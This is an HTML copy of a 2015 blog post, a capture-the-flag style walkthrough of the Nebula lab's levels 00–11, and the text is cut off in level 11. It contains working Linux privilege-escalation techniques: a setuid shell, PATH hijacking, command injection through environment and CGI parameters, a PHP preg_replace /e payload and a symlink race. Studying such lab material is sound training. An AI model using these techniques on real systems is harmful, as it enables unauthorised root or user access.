<!doctype html><html lang=en dir=auto>
<head><meta charset=utf-8>
<meta http-equiv=x-ua-compatible content="IE=edge">
<meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no">
<meta name=robots content="index, follow">
<title>playing exploit-exercises - nebula | #!/bin/note
</title>
<meta name=keywords content>
<meta name=description content="introduction
Recently I decided I wanted to have a look at what Exploit Exercises had to offer. I was after the memory corruption related exploitation stuff to play with, until I saw the details for Nebula. Nebula covers a variety of simple and intermediate challenges that cover Linux privilege escalation, common scripting language issues, and file system race conditions.

     


I did not really have a lot of time on my hands and figured I should start with the &ldquo;easy&rdquo; stuff. Many of the levels Nebula presented were in fact very, very easy. However, towards final levels my knowledge was definitely being tested. Levels started taking much longer to complete as I was yet again realizing that the more you learn, the more you realize you you still have to learn. :)
This is the path I took to solve the 20 challenges.">
<meta name=author content="Leon Jacobs">
<link rel=canonical href=https://leonjza.github.io/blog/2015/05/08/playing-exploit-exercises-nebula/>
<link crossorigin=anonymous href=/assets/css/stylesheet.min.5e2b4101351c21e906f398ae96901791830f58d430f96f2659dab7eaef7b3cb7.css integrity="sha256-XitBATUcIekG85iulpAXkYMPWNQw+W8mWdq36u97PLc=" rel="preload stylesheet" as=style>
<script defer crossorigin=anonymous src=/assets/js/highlight.min.7680afc38aa6b15ddf158a4f3780b7b1f7dde7e91d26f073e6229bb7a0793c92.js integrity="sha256-doCvw4qmsV3fFYpPN4C3sffd5+kdJvBz5iKbt6B5PJI=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://leonjza.github.io/favicon.ico>
<link rel=icon type=image/png sizes=16x16 href=https://leonjza.github.io/favicon-16x16.png>
<link rel=icon type=image/png sizes=32x32 href=https://leonjza.github.io/favicon-32x32.png>
<link rel=apple-touch-icon href=https://leonjza.github.io/apple-touch-icon.png>
<link rel=mask-icon href=https://leonjza.github.io/safari-pinned-tab.svg>
<meta name=theme-color content="#2e2e33">
<meta name=msapplication-TileColor content="#2e2e33">
<meta name=generator content="Hugo 0.88.1">
<noscript>
<style>#theme-toggle,.top-link{display:none}</style>
<style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style>
</noscript>
<script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(a,e,f,g,b,c,d){a.GoogleAnalyticsObject=b,a[b]=a[b]||function(){(a[b].q=a[b].q||[]).push(arguments)},a[b].l=1*new Date,c=e.createElement(f),d=e.getElementsByTagName(f)[0],c.async=1,c.src=g,d.parentNode.insertBefore(c,d)}(window,document,'script','https://www.google-analytics.com/analytics.js','ga'),ga('create','UA-44457032-2','auto'),ga('send','pageview'))</script><meta property="og:title" content="playing exploit-exercises - nebula">
<meta property="og:description" content="introduction
Recently I decided I wanted to have a look at what Exploit Exercises had to offer. I was after the memory corruption related exploitation stuff to play with, until I saw the details for Nebula. Nebula covers a variety of simple and intermediate challenges that cover Linux privilege escalation, common scripting language issues, and file system race conditions.

     


I did not really have a lot of time on my hands and figured I should start with the &ldquo;easy&rdquo; stuff. Many of the levels Nebula presented were in fact very, very easy. However, towards final levels my knowledge was definitely being tested. Levels started taking much longer to complete as I was yet again realizing that the more you learn, the more you realize you you still have to learn. :)
This is the path I took to solve the 20 challenges.">
<meta property="og:type" content="article">
<meta property="og:url" content="https://leonjza.github.io/blog/2015/05/08/playing-exploit-exercises-nebula/"><meta property="article:section" content="posts">
<meta property="article:published_time" content="2015-05-08T07:18:31+00:00">
<meta property="article:modified_time" content="2015-05-08T07:18:31+00:00"><meta property="og:site_name" content="#!/bin/note
">
<meta name=twitter:card content="summary">
<meta name=twitter:title content="playing exploit-exercises - nebula">
<meta name=twitter:description content="introduction
Recently I decided I wanted to have a look at what Exploit Exercises had to offer. I was after the memory corruption related exploitation stuff to play with, until I saw the details for Nebula. Nebula covers a variety of simple and intermediate challenges that cover Linux privilege escalation, common scripting language issues, and file system race conditions.

     


I did not really have a lot of time on my hands and figured I should start with the &ldquo;easy&rdquo; stuff. Many of the levels Nebula presented were in fact very, very easy. However, towards final levels my knowledge was definitely being tested. Levels started taking much longer to complete as I was yet again realizing that the more you learn, the more you realize you you still have to learn. :)
This is the path I took to solve the 20 challenges.">
<script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":2,"name":"Posts","item":"https://leonjza.github.io/posts/"},{"@type":"ListItem","position":3,"name":"playing exploit-exercises - nebula","item":"https://leonjza.github.io/blog/2015/05/08/playing-exploit-exercises-nebula/"}]}</script>
<script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"playing exploit-exercises - nebula","name":"playing exploit-exercises - nebula","description":"introduction Recently I decided I wanted to have a look at what Exploit Exercises had to offer. I was after the memory corruption related exploitation stuff to play with, until I saw the details for Nebula. Nebula covers a variety of simple and intermediate challenges that cover Linux privilege escalation, common scripting language issues, and file system race conditions.\n  I did not really have a lot of time on my hands and figured I should start with the \u0026ldquo;easy\u0026rdquo; stuff. Many of the levels Nebula presented were in fact very, very easy. However, towards final levels my knowledge was definitely being tested. Levels started taking much longer to complete as I was yet again realizing that the more you learn, the more you realize you you still have to learn. :)\nThis is the path I took to solve the 20 challenges.\n","keywords":[],"articleBody":"introduction Recently I decided I wanted to have a look at what Exploit Exercises had to offer. I was after the memory corruption related exploitation stuff to play with, until I saw the details for Nebula. Nebula covers a variety of simple and intermediate challenges that cover Linux privilege escalation, common scripting language issues, and file system race conditions.\n  I did not really have a lot of time on my hands and figured I should start with the “easy” stuff. Many of the levels Nebula presented were in fact very, very easy. However, towards final levels my knowledge was definitely being tested. Levels started taking much longer to complete as I was yet again realizing that the more you learn, the more you realize you you still have to learn. :)\nThis is the path I took to solve the 20 challenges.\nsetup On the details page, one could easily learn the format of the challenges, as well as some information should you need to get root access on the VM to configure things. Obviously the point is not to login with this account to solve challenges, but merely to fix things if they are broken for some reason.\nAfter my download finished, I booted the live image, checked the IP address it got assigned using the Nebula account and tried to SSH in:\n~ » ssh level00@192.168.217.239 no hostkey alg sigh. Some quick diagnostics showed that my SSH client was attempting to identify the remote server with a RSA/DSA key, but none was being presented. So, I quickly escalated the nebula account to root and generated a RSA host key with: ssh-keygen -t rsa -f /etc/ssh/ssh_host_rsa_key with no password. I was now able to log in:\n~ » ssh level00@192.168.217.239 The authenticity of host '192.168.217.239 (192.168.217.239)' can't be established. RSA key fingerprint is cf:cf:68:5b:01:05:a8:52:aa:19:aa:54:a8:27:5d:46. Are you sure you want to continue connecting (yes/no)? yes Warning: Permanently added '192.168.217.239' (RSA) to the list of known hosts. _ __ __ __ / | / /__ / /_ __ __/ /___ _ / |/ / _ \\/ __ \\/ / / / / __ `/ / /| / __/ /_/ / /_/ / / /_/ / /_/ |_/\\___/_.___/\\__,_/_/\\__,_/ exploit-exercises.com/nebula For level descriptions, please see the above URL. To log in, use the username of \"levelXX\" and password \"levelXX\", where XX is the level number. Currently there are 20 levels (00 - 19). level00@192.168.217.239's password: Welcome to Ubuntu 11.10 (GNU/Linux 3.0.0-12-generic i686) * Documentation: https://help.ubuntu.com/ New release '12.04 LTS' available. Run 'do-release-upgrade' to upgrade to it. The programs included with the Ubuntu system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. level00@nebula:~$ I could see that I was now logged in as level00\nlevel00@nebula:~$ id uid=1001(level00) gid=1001(level00) groups=1001(level00) The challenges are all in their respective flag folder. So if you are logged in as level00, you are interested in flag00. Once you have exploited whatever needed exploiting and gained the privileges of the respective flag, the command getflag could be run to confirm that you have the correct access. For the most part, I actually wanted to get shells as the users I escalated to, but just running getflag is enough to consider a level done. I had prepared a small C setuid shell in /var/tmp/shell.c with the following output:\n#include int main(void) { setresuid(geteuid(), geteuid(), geteuid()); system(\"/bin/sh\"); return 0; } This shell was reused throughout the challenges. Lets dig into the challenges themselves.\nlevel00 Level00’s Description:\n This level requires you to find a Set User ID program that will run as the “flag00” account. You could also find this by carefully looking in top level directories in / for suspicious looking directories.\n Finding SUID binaries is really easy. I guess because this is the format most of the challenges are in, it was a good start to get the challenger to know about SUID binaries :P\nSo, to solve level00:\nlevel00@nebula:~$ find / -perm -4000 2 /dev/null | xargs ls -lh -rwsr-x--- 1 flag00 level00 7.2K 2011-11-20 21:22 /bin/.../flag00 -rwsr-xr-x 1 root root 26K 2011-05-18 03:12 /bin/fusermount -rwsr-xr-x 1 root root 87K 2011-08-09 09:15 /bin/mount -rwsr-xr-x 1 root root 34K 2011-05-03 03:38 /bin/ping -rwsr-xr-x 1 root root 39K 2011-05-03 03:38 /bin/ping6 -rwsr-xr-x 1 root root 31K 2011-06-24 02:37 /bin/su -rwsr-xr-x 1 root root 63K 2011-08-09 09:15 /bin/umount -rwsr-x--- 1 flag00 level00 7.2K 2011-11-20 21:22 /rofs/bin/.../flag00 -rwsr-xr-x 1 root root 26K 2011-05-18 03:12 /rofs/bin/fusermount -rwsr-xr-x 1 root root 87K 2011-08-09 09:15 /rofs/bin/mount [...] level00@nebula:~$ /bin/.../flag00 Congrats, now run getflag to get your flag! flag00@nebula:~$ getflag You have successfully executed getflag on a target account level01 Level01’s Description:\n There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?\n With the description we are provided with the source code of a small C program:\n#include #include #include #include #include  int main(int argc, char **argv, char **envp) { gid_t gid; uid_t uid; gid = getegid(); uid = geteuid(); setresgid(gid, gid, gid); setresuid(uid, uid, uid); system(\"/usr/bin/env echo and now what?\"); } We can see a bunch of UID/GID stuff being set with with setresgid and setresuid and then a system command being run with system(). The problem lies in the fact that the command that is being run does not have a full path specified for the echo command. Even though its called with /usr/bin/env, it is possible to modify the current PATH variable and have env report echo as being somewhere other than where it would normally be.\nOn the filesystem we find the flag01 binary and can see it is setuid for flag01 user (we are currently logged in as level01):\nlevel01@nebula:~$ cd ~flag01/ level01@nebula:/home/flag01$ ls -lh flag01 -rwsr-x--- 1 flag01 level01 7.2K 2011-11-20 21:22 flag01 level01@nebula:/home/flag01$ ./flag01 and now what? Abusing this is really easy. I decided to create my own echo binary and modified PATH so that it is called instead of the real echo. A small note here though. The Nebula vm has /tmp mounted with the nosuid option. I see this many times in the real world. What this effectively means is that any suid bit will be ignored for binaries executed on this mount point. Luckily though my second resort being /var/tmp was not mounted separately and I had write access there :)\nlevel01@nebula:/home/flag01$ mount | grep \"/tmp\" tmpfs on /tmp type tmpfs (rw,nosuid,nodev) level01@nebula:/home/flag01$ ls -lah /var/ | grep tmp drwxrwxrwt 3 root root 29 2012-08-23 18:46 tmp So, to solve level01:\nlevel01@nebula:/home/flag01$ cat /var/tmp/echo #!/bin/sh gcc /var/tmp/shell.c -o /var/tmp/flag01 chmod 4777 /var/tmp/flag01 level01@nebula:/home/flag01$ ls -lh /var/tmp/echo -rwxrwxr-x 1 level01 level01 77 2015-05-08 07:35 /var/tmp/echo level01@nebula:/home/flag01$ cat /var/tmp/shell.c #include int main(void) { setresuid(geteuid(), geteuid(), geteuid()); system(\"/bin/sh\"); return 0; } level01@nebula:/home/flag01$ export PATH=/var/tmp:$PATH level01@nebula:/home/flag01$ ./flag01 level01@nebula:/home/flag01$ ls -lah /var/tmp/flag01 -rwsrwxrwx 1 flag01 level01 7.1K 2015-05-08 07:37 /var/tmp/flag01 level01@nebula:/home/flag01$ /var/tmp/flag01 sh-4.2$ getflag You have successfully executed getflag on a target account level02 Level02’s Description:\n There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?\n With the description we are provided with the source code of a small C program:\n#include #include #include #include #include  int main(int argc, char **argv, char **envp) { char *buffer; gid_t gid; uid_t uid; gid = getegid(); uid = geteuid(); setresgid(gid, gid, gid); setresuid(uid, uid, uid); buffer = NULL; asprintf(\u0026buffer, \"/bin/echo %s is cool\", getenv(\"USER\")); printf(\"about to call system(\\\"%s\\\")\\n\", buffer); system(buffer); } Level02 is very similar to Level01, except for that fact that here the line /bin/echo %s is cool is copied to buffer and eventually put through a system() call. The value of the current environment variable USER is added to the command. This is another easy exploit where a simple shell escape will do to get us our own shell. I prepped the shell to echo the word bob, the delimit the command with a ; character and specify the command I want to run. I then end it off with a hash (#) to ignore the rest of the commands that the program has hard coded (is cool in this case).\nSo, to solve level02:\nlevel02@nebula:/home/flag02$ ./flag02 about to call system(\"/bin/echo level02 is cool\") level02 is cool level02@nebula:/home/flag02$ USER=\"bob\" \u0026\u0026 ./flag02 about to call system(\"/bin/echo bob is cool\") bob is cool level02@nebula:/home/flag02$ cat /var/tmp/shell.c #include int main(void) { setresuid(geteuid(), geteuid(), geteuid()); system(\"/bin/sh\"); return 0; } level02@nebula:/home/flag02$ USER=\"bob; id;#\" \u0026\u0026 ./flag02 about to call system(\"/bin/echo bob; id;# is cool\") bob uid=997(flag02) gid=1003(level02) groups=997(flag02),1003(level02) level02@nebula:/home/flag02$ USER=\"bob; gcc /var/tmp/shell.c -o /var/tmp/flag02; chmod 4777 /var/tmp/flag02;#\" \u0026\u0026 ./flag02 about to call system(\"/bin/echo bob; gcc /var/tmp/shell.c -o /var/tmp/flag02; chmod 4777 /var/tmp/flag02;# is cool\") bob level02@nebula:/home/flag02$ /var/tmp/flag02 sh-4.2$ getflag You have successfully executed getflag on a target account level03 Level03’s Description:\n Check the home directory of flag03 and take note of the files there. There is a crontab that is called every couple of minutes.\n Logging in as level03, we find a directory and a sh script:\nlevel03@nebula:~$ cd ~flag03 level03@nebula:/home/flag03$ ls -lh total 512 drwxrwxrwx 2 flag03 flag03 3 2012-08-18 05:24 writable.d -rwxr-xr-x 1 flag03 flag03 98 2011-11-20 21:22 writable.sh level03@nebula:/home/flag03$ cat writable.sh #!/bin/sh for i in /home/flag03/writable.d/* ; do (ulimit -t 5; bash -x \"$i\") rm -f \"$i\" done With the mention of a cronjob, I assumed the writable.sh script was being run. From the source of the script we can see that everything in /home/flag03/writable.d/ will have a ulimit set so that processes don’t take more than 5 seconds, and be executed using bash -x. Once done, the file is removed. Easy to exploit.\nSo, to solve level03:\nlevel03@nebula:/home/flag03$ vim /var/tmp/flag03.sh level03@nebula:/home/flag03$ cat /var/tmp/flag03.sh #!/bin/sh gcc /var/tmp/shell.c -o /var/tmp/flag03 chmod 4777 /var/tmp/flag03 level03@nebula:/home/flag03$ cat /var/tmp/shell.c #include int main(void) { setresuid(geteuid(), geteuid(), geteuid()); system(\"/bin/sh\"); return 0; } level03@nebula:/home/flag03$ cp /var/tmp/flag03.sh /home/flag03/writable.d/ level03@nebula:/home/flag03$ # wait some time for the cronjob level03@nebula:/home/flag03$ /var/tmp/flag03 sh-4.2$ getflag You have successfully executed getflag on a target account level04 Level04’s Description:\n This level requires you to read the token file, but the code restricts the files that can be read. Find a way to bypass it :)\n With the description we are provided with the source code of a small C program:\n#include #include #include #include #include #include  int main(int argc, char **argv, char **envp) { char buf[1024]; int fd, rc; if(argc == 1) { printf(\"%s [file to read]\\n\", argv[0]); exit(EXIT_FAILURE); } if(strstr(argv[1], \"token\") != NULL) { printf(\"You may not access '%s'\\n\", argv[1]); exit(EXIT_FAILURE); } fd = open(argv[1], O_RDONLY); if(fd == -1) { err(EXIT_FAILURE, \"Unable to open %s\", argv[1]); } rc = read(fd, buf, sizeof(buf)); if(rc == -1) { err(EXIT_FAILURE, \"Unable to read fd %d\", fd); } write(1, buf, rc); } From the snippet we can see that a check is in place for the first argument to see if the string token exists in it. As the token we want to read is actually called token this check will obviously prevent us from reading it. As we also don’t have write access to the file we cant rename it either. We can however make a symlink to it with a different name, thereby circumventing this check.\nSo, to solve level04:\nlevel04@nebula:/home/flag04$ ln -s /home/flag04/token /var/tmp/flag04 level04@nebula:/home/flag04$ ./flag04 /var/tmp/flag04 06508b5e-8909-4f38-b630-fdb148a848a2 level04@nebula:/home/flag04$ su - flag04 Password: flag04@nebula:~$ getflag You have successfully executed getflag on a target account level05 Level05’s Description:\n Check the flag05 home directory. You are looking for weak directory permissions\n Browsing to the flag05 directory we can see a .backup directory containing a tar archive that is readable. This archive contained a private key that allowed login as the flag05 user.\nSo, to solve level05:\nlevel05@nebula:~$ cd ~flag05 level05@nebula:/home/flag05$ ls -lah total 5.0K drwxr-x--- 4 flag05 level05 93 2012-08-18 06:56 . drwxr-xr-x 1 root root 220 2012-08-27 07:18 .. drwxr-xr-x 2 flag05 flag05 42 2011-11-20 20:13 .backup -rw-r--r-- 1 flag05 flag05 220 2011-05-18 02:54 .bash_logout -rw-r--r-- 1 flag05 flag05 3.3K 2011-05-18 02:54 .bashrc -rw-r--r-- 1 flag05 flag05 675 2011-05-18 02:54 .profile drwx------ 2 flag05 flag05 70 2011-11-20 20:13 .ssh level05@nebula:/home/flag05$ cd .backup/ level05@nebula:/home/flag05/.backup$ ls -lah total 2.0K drwxr-xr-x 2 flag05 flag05 42 2011-11-20 20:13 . drwxr-x--- 4 flag05 level05 93 2012-08-18 06:56 .. -rw-rw-r-- 1 flag05 flag05 1.8K 2011-11-20 20:13 backup-19072011.tgz level05@nebula:/home/flag05/.backup$ tar -xvf backup-19072011.tgz -C /var/tmp/ .ssh/ .ssh/id_rsa.pub .ssh/id_rsa .ssh/authorized_keys level05@nebula:/home/flag05/.backup$ ssh -i /var/tmp/.ssh/id_rsa flag05@127.0.0.1 The authenticity of host '127.0.0.1 (127.0.0.1)' can't be established. ECDSA key fingerprint is ea:8d:09:1d:f1:69:e6:1e:55:c7:ec:e9:76:a1:37:f0. Are you sure you want to continue connecting (yes/no)? yes Warning: Permanently added '127.0.0.1' (ECDSA) to the list of known hosts. [...] flag05@nebula:~$ getflag You have successfully executed getflag on a target account level06 Level06’s Description:\n The flag06 account credentials came from a legacy unix system.\n Legacy unix system? This immediately had me thinking that the password hash may be in /etc/passwd. Older unix systems used to store passwords this way, but that is no longer the case.\nlevel06@nebula:~$ cat /etc/passwd| grep flag06 flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/sh The hash ueqwOCnSGdsuM is something that I had to send to john to crack. So I just copied it over to a Kali linux instance and attempted to crack it with brute force. It took a few micro seconds to crack :P\n~ # cat hash ueqwOCnSGdsuM ~ # john hash Loaded 1 password hash (Traditional DES [128/128 BS SSE2]) hello (?) guesses: 1 time: 0:00:00:00 DONE (Fri May 8 17:29:20 2015) c/s: 102400 trying: 123456 - Pyramid Use the \"--show\" option to display all of the cracked passwords reliably The password is hello. So, to solve level06:\nlevel06@nebula:~$ su - flag06 Password: flag06@nebula:~$ getflag You have successfully executed getflag on a target account level07 Level07’s Description:\n The flag07 user was writing their very first perl program that allowed them to ping hosts to see if they were reachable from the web server.\n With the description we are provided with the source code of a small Perl program:\n#!/usr/bin/perl use CGI qw{param}; print \"Content-type: text/html\\n\\n\"; sub ping { $host = $_[0]; print(\"Ping results\"); @output = `ping -c 3 $host 2\u00261`; foreach $line (@output) { print \"$line\"; } print(\"\"); } # check if Host set. if not, display normal page, etc ping(param(\"Host\")); This script has a very obvious command injection problem in the ping command. It also looks like something that should be served by a web server. In the flag07 directory one can see a thttpd.conf file which contains the port of the webserver serving this script on.\nlevel07@nebula:/home/flag07$ grep port thttpd.conf # Specifies an alternate port number to listen on. port=7007 # all hostnames supported on the local machine. See thttpd(8) for details. Exploiting the vulnerability simply meant that we have to inject commands into the Host parameter. I normally use python’s urllib to ensure that fields are properly url encoded etc.\nSo, to solve level07:\n~ » curl -v \"http://192.168.217.239:7007/index.cgi?$(python -c 'import urllib; print urllib.urlencode({ \"Host\" : \"127.0.0.1 \u0026\u0026 gcc /var/tmp/shell.c -o /var/tmp/flag07 \u0026\u0026 chmod 4777 /var/tmp/flag07\" })')\" * Hostname was NOT found in DNS cache * Trying 192.168.217.239... * Connected to 192.168.217.239 (192.168.217.239) port 7007 (#0)  GET /index.cgi?Host=127.0.0.1+%26%26+gcc+%2Fvar%2Ftmp%2Fshell.c+-o+%2Fvar%2Ftmp%2Fflag07+%26%26+chmod+4777+%2Fvar%2Ftmp%2Fflag07 HTTP/1.1  User-Agent: curl/7.37.1  Host: 192.168.217.239:7007  Accept: */*  * HTTP 1.0, assume close after body 200 OK Ping resultsPING 127.0.0.1 (127.0.0.1) 56(84) bytes of data. 64 bytes from 127.0.0.1: icmp_req=1 ttl=64 time=0.011 ms 64 bytes from 127.0.0.1: icmp_req=2 ttl=64 time=0.023 ms 64 bytes from 127.0.0.1: icmp_req=3 ttl=64 time=0.022 ms --- 127.0.0.1 ping statistics --- 3 packets transmitted, 3 received, 0% packet loss, time 1998ms rtt min/avg/max/mdev = 0.011/0.018/0.023/0.007 ms * Closing connection 0  And finally back on the NebulaVM after this curl from my host:\nlevel07@nebula:/home/flag07$ /var/tmp/flag07 sh-4.2$ getflag You have successfully executed getflag on a target account level08 Level08’s Description:\n World readable files strike again. Check what that user was up to, and use it to log into flag08 account.\n Logging in as the user level08 reveals a pcap in the flag08 directory:\nlevel08@nebula:~$ cd ~flag08 level08@nebula:/home/flag08$ ls capture.pcap level08@nebula:/home/flag08$ file capture.pcap capture.pcap: tcpdump capture file (little-endian) - version 2.4 (Ethernet, capture length 65535) I copied the pcap off the box and opened it on my Kali Linux VM with wireshark to investigate:\n  Here we can see some data that got captured in clear text. It looks like a telnet session where someone was logging in with the level8 account. The password though has a few dots in it. To make more sense of these, I switched the stream view to hex so that we can try see the ASCII codes of the keypresses.\n  F7 according to the ASCII table is a backspace. That makes this easy :) Considering we have the password backdoor...00Rm8.ate, substituting the dot with backspaces we end up with backd00Rmate as the password.\nSo, to solve level08:\nlevel08@nebula:/home/flag08$ su - flag08 Password: flag08@nebula:~$ getflag You have successfully executed getflag on a target account level09 Level09’s Description:\n There’s a C setuid wrapper for some vulnerable PHP code…\n With the description we are provided with the source code of a small PHP program:\nphp function spam($email) { $email = preg_replace(\"/\\./\", \" dot \", $email); $email = preg_replace(\"/@/\", \" AT \", $email); return $email; } function markup($filename, $use_me) { $contents = file_get_contents($filename); $contents = preg_replace(\"/(\\[email (.*)\\])/e\", \"spam(\\\"\\\\2\\\")\", $contents); $contents = preg_replace(\"/\\[/\", \", $contents); $contents = preg_replace(\"/\\]/\", \"\", $contents); return $contents; } $output = markup($argv[1], $argv[2]); print $output; ?In the flag09 directory, we have the above PHP sample as well as a SUID binary.\nlevel09@nebula:~$ cd ~flag09 level09@nebula:/home/flag09$ ls -lh total 8.0K -rwsr-x--- 1 flag09 level09 7.1K 2011-11-20 21:22 flag09 -rw-r--r-- 1 root root 491 2011-11-20 21:22 flag09.php At first I managed to solve this one really fast. When flag09 is invoked with -h, it seemed like it passed the arguments directly to a PHP binary. So, I was able to drop into an interactive PHP shell and execute commands from there:\nlevel09@nebula:/home/flag09$ ./flag09 -a Interactive shell php  system(\"id\"); uid=1010(level09) gid=1010(level09) euid=990(flag09) groups=990(flag09),1010(level09) With this I would have been able to prepare the small flag09 setuid shell and complete the level. However, I did not think this was the intended route so I continued to investigate the PHP program further.\nThe PHP code basically had 2 main functions. markup() and spam(). markup() would read the contents of a file (who’s location is read as the first command line argument), and using regex, search for a pattern matching [email addr] where addr will be the extracted part. It then as a callback executes spam() which will convert . to dot and @ to AT. I took a really long time researching the preg_replace() functions and potential exploits with it. Eventually I came across a post describing how code injection may be possible when preg_replace() is called with the e modifier. This blogpost explains the vulnerability in pretty great detail. That blogpost coupled with the PHP docs here helps develop a payload for exploitation. The PHP documentation has a sample of {${eval($_GET[php_code])}} which is what I used to finish the final payload for this level.\nAnother thing to note about the PHP code is the $use_me variable passed to the markup() function. It only gets declared and never gets used later. I think the developer of this level wanted this to be a form of hint, but it was handy to get code execution as argument 2 on the command line will be the command we want to execute :)\nSo, to solve level09:\nlevel09@nebula:/home/flag09$ echo -ne \"[email {\\${system(\\$use_me)}}]\"  /var/tmp/flag09.txt level09@nebula:/home/flag09$ cat /var/tmp/flag09.txt [email {${system($use_me)}}] level09@nebula:/home/flag09$ ./flag09 /var/tmp/flag09.txt \"gcc /var/tmp/shell.c -o /var/tmp/flag09; chmod 4777 /var/tmp/flag09\" PHP Notice: Undefined variable: in /home/flag09/flag09.php(15) : regexp code on line 1 level09@nebula:/home/flag09$ /var/tmp/flag09 sh-4.2$ getflag You have successfully executed getflag on a target account intermission From here, the levels became noticeably harder for me. A lot of the levels had me researching new things that I was unsure of. :)\nI wont detail all of the failed attempts. There were so many. Only the successes (and if a failure was significant) will land here :P Lets get to them!\nlevel10 Level10’s Description:\n The setuid binary at /home/flag10/flag10 binary will upload any file given, as long as it meets the requirements of the access() system call.\n With the description we are provided with the source code of a small PHP program:\n#include #include #include #include #include #include #include #include #include  int main(int argc, char **argv) { char *file; char *host; if(argc  3) { printf(\"%s file host\\n\\tsends file to host if you have access to it\\n\", argv[0]); exit(1); } file = argv[1]; host = argv[2]; if(access(argv[1], R_OK) == 0) { int fd; int ffd; int rc; struct sockaddr_in sin; char buffer[4096]; printf(\"Connecting to %s:18211 .. \", host); fflush(stdout); fd = socket(AF_INET, SOCK_STREAM, 0); memset(\u0026sin, 0, sizeof(struct sockaddr_in)); sin.sin_family = AF_INET; sin.sin_addr.s_addr = inet_addr(host); sin.sin_port = htons(18211); if(connect(fd, (void *)\u0026sin, sizeof(struct sockaddr_in)) == -1) { printf(\"Unable to connect to host %s\\n\", host); exit(EXIT_FAILURE); } #define HITHERE \".oO Oo.\\n\"  if(write(fd, HITHERE, strlen(HITHERE)) == -1) { printf(\"Unable to write banner to host %s\\n\", host); exit(EXIT_FAILURE); } #undef HITHERE  printf(\"Connected!\\nSending file .. \"); fflush(stdout); ffd = open(file, O_RDONLY); if(ffd == -1) { printf(\"Damn. Unable to open file\\n\"); exit(EXIT_FAILURE); } rc = read(ffd, buffer, sizeof(buffer)); if(rc == -1) { printf(\"Unable to read from file: %s\\n\", strerror(errno)); exit(EXIT_FAILURE); } write(fd, buffer, rc); printf(\"wrote file!\\n\"); } else { printf(\"You don't have access to %s\\n\", file); } } As the description has it, this program seems to read a file and send its contents to a user specified IP address on tcp/18211. I tested this by opening a netcat listener with nc -lk 18211 and sending myself a file to see what comes out. Obviously, I was not able to send the token that was in the same directory as the flag10 binary as I did not have read access to this.\nThe problem with this program through is the fact that it checks if the file can be read using access(), then only later opens it using open(). Using this method it may be possible to change out the file before it hits the open() method. Symlinks are the goto for this kind of problem as they can be easily swapped out by relinking a file as the program runs. It of course helps that the file to read can be user specified. There is actually an acronym for this kind of bug called TOCTTOU. The Wikipedia article describes almost exactly the same scenario as we have here.\nMy plan of attack was to create a race condition. I would create an infinite loop that relinks a file from something I can actually read back to the token file and vice versa. While this continuous relinking occurs, I would run the affected binary, hoping that we would catch a case where the link swaps out as hoped for sending the token contents to my netcat listener. To increase my chances of the race condition occurring, I put the flag10 binary in its own loop as well.\nSo, to solve level10:\nlevel10@nebula:/home/flag10$ while true; do ln -sf /var/tmp/shell.c /var/tmp/flag10-token; ln -sf /home/flag10/token /var/tmp/flag10-token; done \u0026 [1] 14219 # the counties symlink swap is now happening between /var/tmp/shell.c which I can read and /home/flag10/token which I cant. level10@nebula:/home/flag10$ while true; do ./flag10 /var/tmp/flag10-token 192.168.217.1; done You don't have access to /var/tmp/flag10-token You don't have access to /var/tmp/flag10-token Connecting to 192.168.217.1:18211 .. Connected! Sending file .. wrote file! Connecting to 192.168.217.1:18211 .. Connected! Sending file .. wrote file! Connecting to 192.168.217.1:18211 .. Connected! Sending file .. wrote file! On my netcat listener I now had:\n~ » nc -lk 18211 .oO Oo. #include int main(void) { setresuid(geteuid(), geteuid(), geteuid()); system(\"/bin/sh\"); return 0; } .oO Oo. 615a2ce1-b2b5-4c76-8eed-8aa5c4015c27 .oO Oo. 615a2ce1-b2b5-4c76-8eed-8aa5c4015c27 .oO Oo. 615a2ce1-b2b5-4c76-8eed-8aa5c4015c27 .oO Oo. With the token file read, we end the level:\nlevel10@nebula:/home/flag10$ su - flag10 Password: flag10@nebula:~$ getflag You have successfully executed getflag on a target account level11 Level11’s Description:\n The setuid binary at /home/flag10/flag10 binary will upload any file given, as long as it meets the requirements of the access() system call.\n With the description we are provided with the source code of a small PHP program:\n#include #include #include #include #include #include #include  /* * Return a random, non predictable file, and return the file descriptor for it. */ int getrand(char **path) { char *tmp; int pid; int fd; srandom(time(NULL)); tmp = getenv(\"TEMP\"); pid = getpid(); asprintf(path, \"%s/%d.%c%c%c%c%c%c\", tmp, pid, 'A' + (random() % 26), '0' + (random() % 10), 'a' + (random() % 26), 'A' + (random() % 26), '0' + (random() % 10), 'a' + (random() % 26)); fd = open(*path, O_CREAT|O_RDWR, 0600); unlink(*path); return fd; } void process(char *buffer, int length) { unsigned int key; int i; key = length \u0026 0xff; for(i = 0; i  length; i++) { buffer[i] ^= key; key -= buffer[i]; } system(buffer); } #define CL \"Content-Length: \"  int main(int argc, char **argv) { char line[256]; char buf[1024]; char *mem; int length; int fd; char *path; if(fgets(line, sizeof(line), stdin) == NULL) { errx(1, \"reading from stdin\"); } if(strncmp(line, CL, strlen(CL)) != 0) { errx(1, \"invalid header\"); } length = atoi(line + strlen(CL)); if(length  sizeof(buf)) { if(fread(buf, length, 1, stdin) != length) { err(1, \"fread length\"); } process(buf, length); } else { int blue = length; int pink; fd = getrand(\u0026path); while(blue  0) { printf(\"blue = %d, length = %d, \", blue, length); pink = fread(buf, 1, sizeof(buf), stdin); printf(\"pink = %d\\n\", pink); if(pink  0) { err(1, \"fread 